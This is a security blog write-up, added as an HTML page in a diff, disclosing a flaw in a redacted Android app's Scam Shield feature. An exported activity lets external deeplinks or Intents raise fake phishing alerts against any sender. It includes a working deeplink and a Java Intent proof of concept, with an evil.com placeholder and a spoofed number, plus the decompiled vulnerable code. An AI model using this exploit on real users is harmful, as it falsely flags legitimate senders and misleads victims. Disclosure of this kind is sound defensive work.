@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Scam Shield Logic Flaw Enables Phishing Alert Spoofing for Any Sender ID or Number | Neilmark Ochea / 0xnmo</title>
+<meta name="keywords" content="">
+<meta name="description" content="A flaw in the Redacted app’s Scam Shield allows external Intents to trigger fake phishing alerts, letting malicious application or crafted deeplinks falsely flag legitimate sender IDs or phone numbers.">
+<meta name="author" content="Me">
+<link rel="canonical" href="https://nmochea.github.io/posts/5-arbitrary-phishing-spoofing/">
+<link crossorigin="anonymous" href="https://nmochea.github.io/assets/css/stylesheet.fd5566c526ae48aadabd950798a2dc3568536401560eae5caac3765a42a9e7b5.css" integrity="sha256-/VVmxSauSKravZUHmKLcNWhTZAFWDq5cqsN2WkKp57U=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://nmochea.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="16x16" href="https://nmochea.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="32x32" href="https://nmochea.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="apple-touch-icon" href="https://nmochea.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="mask-icon" href="https://nmochea.github.io/%3Clink%20/%20abs%20url%3E">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://nmochea.github.io/posts/5-arbitrary-phishing-spoofing/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://nmochea.github.io/posts/5-arbitrary-phishing-spoofing/">
+  <meta property="og:site_name" content="Neilmark Ochea / 0xnmo">
+  <meta property="og:title" content="Scam Shield Logic Flaw Enables Phishing Alert Spoofing for Any Sender ID or Number">
+  <meta property="og:description" content="A flaw in the Redacted app’s Scam Shield allows external Intents to trigger fake phishing alerts, letting malicious application or crafted deeplinks falsely flag legitimate sender IDs or phone numbers.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-22T12:17:51+08:00">
+    <meta property="article:modified_time" content="2025-12-22T12:17:51+08:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Scam Shield Logic Flaw Enables Phishing Alert Spoofing for Any Sender ID or Number">
+<meta name="twitter:description" content="A flaw in the Redacted app’s Scam Shield allows external Intents to trigger fake phishing alerts, letting malicious application or crafted deeplinks falsely flag legitimate sender IDs or phone numbers.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://nmochea.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Scam Shield Logic Flaw Enables Phishing Alert Spoofing for Any Sender ID or Number",
+      "item": "https://nmochea.github.io/posts/5-arbitrary-phishing-spoofing/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Scam Shield Logic Flaw Enables Phishing Alert Spoofing for Any Sender ID or Number",
+  "name": "Scam Shield Logic Flaw Enables Phishing Alert Spoofing for Any Sender ID or Number",
+  "description": "A flaw in the Redacted app’s Scam Shield allows external Intents to trigger fake phishing alerts, letting malicious application or crafted deeplinks falsely flag legitimate sender IDs or phone numbers.",
+  "keywords": [
+    
+  ],
+  "articleBody": "Summary The Redacted application has an SMS Scam Shield feature that processes incoming SMS messages and generates phishing alerts. The exported BaseActivity accepts Intents from external applications to trigger phishing notifications without any input validation. As a result, a malicious web application hosting a crafted deeplink and an installed malicious application can exploit the behavior to display phishing alerts and flag legitimate sender IDs or numbers as phishing.\nImpact An attacker can exploit this issue through both a browser and a malicious mobile application installed on the victim’s device to:\nA user visiting a malicious website with a crafted deeplink can launch the phishing alert and falsely flag legitimate sender IDs and phone numbers as phishing. A malicious application can launch the phishing alert and falsely flag legitimate sender IDs and phone numbers as phishing. Exploit To exploit this issue, the victim must visit a website hosting a crafted deeplink, and a malicious application must be installed on the victim’s device. See the HTML and Java code below:\nMalicious web application .html\n\u003ca href=\"redacted://new.redacted.com.ph/redactedpath?action=sms_phishing\u0026phishing_url=https://nmochea.com\u0026sms_body=Warning very bad, bad messages!\u0026sender_id=+639123456789\"\u003e Xploitz \u003c/a\u003e Malicious mobile application .java\nIntent yeyyy = new Intent(); yeyyy.setClassName(\"ph.com.redacted\", \"ph.com.redacted.BaseActivity\"); yeyyy.putExtra(\"sms_protect_notification\", \"CatcherFragment\"); yeyyy.putExtra(\"phishing_url\", \"https://evil.com\"); yeyyy.putExtra(\"phishing_sms_body\", \"Warning very bad, bad messages!\"); yeyyy.putExtra(\"phishing_sender_id\", \"+639123456789\"); startActivity(yeyyy); Technical Details The exported BaseActivity automatically handles any incoming Intent through onCreate() and onNewIntent(). Both of these methods pass the Intent straight to m55166H(intent) without checking or validating the input, which means anything sent to this activity can be processed without restriction.\nIn BaseActivity():\n@Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); ... m55166H(getIntent()); // Processes launch Intent ... } @Override protected void onNewIntent(Intent intent) { super.onNewIntent(intent); m55166H(intent); // Processes subsequent Intents ... } The m55166H(Intent) method is use to handle internal extras for redacted application SMS Scam Shield feature. However, it trusts every incoming Intent extra without any validation. Once the sms_protect_notification extra matches CatcherFragment, the method blindly reads the values you provide in phishing_url, phishing_sms_body, and phishing_sender_id, builds a deep link from them, and immediately executes it through handleDeepLink().\nIn BaseActivity.m55166H(Intent intent):\nBaseActivity baseActivity2 = this; if (intent != null) { String stringExtra = intent.getStringExtra(\"sms_protect_notification\"); // Controlled extra if (stringExtra != null) { if (stringExtra.equals(\"CatcherFragment\")) { // No validation before using input String stringExtra2 = intent.getStringExtra(BrazeConst.Properties.PHISHING_URL); // Controlled data String stringExtra3 = intent.getStringExtra(\"phishing_sms_body\"); // Controlled data String stringExtra4 = intent.getStringExtra(\"phishing_sender_id\"); // Controlled data GeneralEventsViewModel generalEventsViewModelM55159A = m55159A(); StringBuilder sbM60851j = AbstractC32857m.m60851j( \"https://new.redacted.com.ph/redactedpath?action=sms_phishing\u0026phishing_url=\", stringExtra2, // Injected data \"\u0026sms_body=\", stringExtra3, // Injected data \"\u0026sender_id=\" ); sbM60851j.append(stringExtra4); // Injected data Uri uri = Uri.parse(sbM60851j.toString()); // Parses built URL GeneralEventsViewModel.handleDeepLink$default(generalEventsViewModelM55159A, uri, null, 2, null); // Executes crafted deeplink return; } return; } } ",
+  "wordCount" : "434",
+  "inLanguage": "en",
+  "datePublished": "2025-12-22T12:17:51+08:00",
+  "dateModified": "2025-12-22T12:17:51+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "Me"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://nmochea.github.io/posts/5-arbitrary-phishing-spoofing/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Neilmark Ochea / 0xnmo",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://nmochea.github.io/%3Clink%20/%20abs%20url%3E"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://nmochea.github.io/" accesskey="h" title="0xnmo (Alt + H)">
+                <img src="https://nmochea.github.io/apple-touch-icon.png" alt="" aria-label="logo"
+                    height="35">0xnmo</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://nmochea.github.io/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://nmochea.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://mobilehackinglab.com" title="Pewpew!">
+                    <span>Pewpew!</span>&nbsp;
+                    <svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round"
+                        stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12">
+                        <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"></path>
+                        <path d="M15 3h6v6"></path>
+                        <path d="M10 14L21 3"></path>
+                    </svg>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://nmochea.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://nmochea.github.io/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Scam Shield Logic Flaw Enables Phishing Alert Spoofing for Any Sender ID or Number
+    </h1>
+    <div class="post-meta"><span title='2025-12-22 12:17:51 +0800 +08'>November 127, 222251</span>&nbsp;·&nbsp;<span>3 min</span>&nbsp;·&nbsp;<span>434 words</span>&nbsp;·&nbsp;<span>Me</span>
+
+</div>
+  </header> 
+  <div class="post-content"><h2 id="summary"><strong>Summary</strong><a hidden class="anchor" aria-hidden="true" href="#summary">#</a></h2>
+<p>The Redacted application has an SMS Scam Shield feature that processes incoming SMS messages and generates phishing alerts. The exported BaseActivity accepts Intents from external applications to trigger phishing notifications without any input validation. As a result, a malicious web application hosting a crafted deeplink and an installed malicious application can exploit the behavior to display phishing alerts and flag legitimate sender IDs or numbers as phishing.</p>
+<h2 id="impact"><strong>Impact</strong><a hidden class="anchor" aria-hidden="true" href="#impact">#</a></h2>
+<p>An attacker can exploit this issue through both a browser and a malicious mobile application installed on the victim’s device to:</p>
+<ul>
+<li>A user visiting a malicious website with a crafted deeplink can launch the phishing alert and falsely flag legitimate sender IDs and phone numbers as phishing.</li>
+<li>A malicious application can launch the phishing alert and falsely flag legitimate sender IDs and phone numbers as phishing.</li>
+</ul>
+<h2 id="exploit"><strong>Exploit</strong><a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h2>
+<p>To exploit this issue, the victim must visit a website hosting a crafted deeplink, and a malicious application must be installed on the victim’s device. See the HTML and Java code below:</p>
+<p><strong>Malicious web application <code>.html</code></strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;redacted://new.redacted.com.ph/redactedpath?action=sms_phishing&amp;phishing_url=https://nmochea.com&amp;sms_body=Warning very bad, bad messages!&amp;sender_id=+639123456789&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    Xploitz
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p><strong>Malicious mobile application <code>.java</code></strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Intent</span><span class="w"> </span><span class="n">yeyyy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Intent</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">yeyyy</span><span class="p">.</span><span class="na">setClassName</span><span class="p">(</span><span class="s">&#34;ph.com.redacted&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;ph.com.redacted.BaseActivity&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">yeyyy</span><span class="p">.</span><span class="na">putExtra</span><span class="p">(</span><span class="s">&#34;sms_protect_notification&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;CatcherFragment&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">yeyyy</span><span class="p">.</span><span class="na">putExtra</span><span class="p">(</span><span class="s">&#34;phishing_url&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;https://evil.com&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">yeyyy</span><span class="p">.</span><span class="na">putExtra</span><span class="p">(</span><span class="s">&#34;phishing_sms_body&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Warning very bad, bad messages!&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">yeyyy</span><span class="p">.</span><span class="na">putExtra</span><span class="p">(</span><span class="s">&#34;phishing_sender_id&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;+639123456789&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">startActivity</span><span class="p">(</span><span class="n">yeyyy</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></div><h2 id="technical-details"><strong>Technical Details</strong><a hidden class="anchor" aria-hidden="true" href="#technical-details">#</a></h2>
+<p>The exported <code>BaseActivity</code> automatically handles any incoming Intent through <code>onCreate()</code> and <code>onNewIntent()</code>. Both of these methods pass the Intent straight to <code>m55166H(intent)</code> <strong>without checking or validating the input</strong>, which means anything sent to this activity can be processed without restriction.</p>
+<p><strong>In <code>BaseActivity()</code>:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">onCreate</span><span class="p">(</span><span class="n">Bundle</span><span class="w"> </span><span class="n">savedInstanceState</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">super</span><span class="p">.</span><span class="na">onCreate</span><span class="p">(</span><span class="n">savedInstanceState</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">m55166H</span><span class="p">(</span><span class="n">getIntent</span><span class="p">());</span><span class="w">        </span><span class="c1">// Processes launch Intent</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">onNewIntent</span><span class="p">(</span><span class="n">Intent</span><span class="w"> </span><span class="n">intent</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">super</span><span class="p">.</span><span class="na">onNewIntent</span><span class="p">(</span><span class="n">intent</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">m55166H</span><span class="p">(</span><span class="n">intent</span><span class="p">);</span><span class="w">             </span><span class="c1">// Processes subsequent Intents</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>The <code>m55166H(Intent)</code> method is use to handle internal extras for redacted application SMS Scam Shield feature. However, it trusts every incoming Intent extra without any validation. Once the <strong>sms_protect_notification</strong> extra matches <strong>CatcherFragment</strong>, the method blindly reads the values you provide in <strong>phishing_url</strong>, <strong>phishing_sms_body</strong>, and <strong>phishing_sender_id</strong>, builds a deep link from them, and immediately executes it through <code>handleDeepLink()</code>.</p>
+<p><strong>In <code>BaseActivity.m55166H(Intent intent)</code>:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">BaseActivity</span><span class="w"> </span><span class="n">baseActivity2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">intent</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">String</span><span class="w"> </span><span class="n">stringExtra</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">intent</span><span class="p">.</span><span class="na">getStringExtra</span><span class="p">(</span><span class="s">&#34;sms_protect_notification&#34;</span><span class="p">);</span><span class="w">  </span><span class="c1">// Controlled extra</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">stringExtra</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">stringExtra</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="s">&#34;CatcherFragment&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">  </span><span class="c1">// No validation before using input</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">String</span><span class="w"> </span><span class="n">stringExtra2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">intent</span><span class="p">.</span><span class="na">getStringExtra</span><span class="p">(</span><span class="n">BrazeConst</span><span class="p">.</span><span class="na">Properties</span><span class="p">.</span><span class="na">PHISHING_URL</span><span class="p">);</span><span class="w">   </span><span class="c1">// Controlled data</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">String</span><span class="w"> </span><span class="n">stringExtra3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">intent</span><span class="p">.</span><span class="na">getStringExtra</span><span class="p">(</span><span class="s">&#34;phishing_sms_body&#34;</span><span class="p">);</span><span class="w">                  </span><span class="c1">// Controlled data</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">String</span><span class="w"> </span><span class="n">stringExtra4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">intent</span><span class="p">.</span><span class="na">getStringExtra</span><span class="p">(</span><span class="s">&#34;phishing_sender_id&#34;</span><span class="p">);</span><span class="w">                 </span><span class="c1">// Controlled data</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">GeneralEventsViewModel</span><span class="w"> </span><span class="n">generalEventsViewModelM55159A</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">m55159A</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">StringBuilder</span><span class="w"> </span><span class="n">sbM60851j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AbstractC32857m</span><span class="p">.</span><span class="na">m60851j</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="s">&#34;https://new.redacted.com.ph/redactedpath?action=sms_phishing&amp;phishing_url=&#34;</span><span class="p">,</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">             </span><span class="n">stringExtra2</span><span class="p">,</span><span class="w">          </span><span class="c1">// Injected data</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">             </span><span class="s">&#34;&amp;sms_body=&#34;</span><span class="p">,</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">             </span><span class="n">stringExtra3</span><span class="p">,</span><span class="w">          </span><span class="c1">// Injected data</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">             </span><span class="s">&#34;&amp;sender_id=&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">sbM60851j</span><span class="p">.</span><span class="na">append</span><span class="p">(</span><span class="n">stringExtra4</span><span class="p">);</span><span class="w">  </span><span class="c1">// Injected data</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">Uri</span><span class="w"> </span><span class="n">uri</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Uri</span><span class="p">.</span><span class="na">parse</span><span class="p">(</span><span class="n">sbM60851j</span><span class="p">.</span><span class="na">toString</span><span class="p">());</span><span class="w">  </span><span class="c1">// Parses built URL</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">GeneralEventsViewModel</span><span class="p">.</span><span class="na">handleDeepLink$default</span><span class="p">(</span><span class="n">generalEventsViewModelM55159A</span><span class="p">,</span><span class="w"> </span><span class="n">uri</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="n">2</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span><span class="w"> </span><span class="c1">// Executes crafted deeplink</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="k">return</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    <footer class="footer">
+    <span>&copy; 2025 Neilmark Ochea / 0xnmo</span>
+</footer></body>
+
+</html>
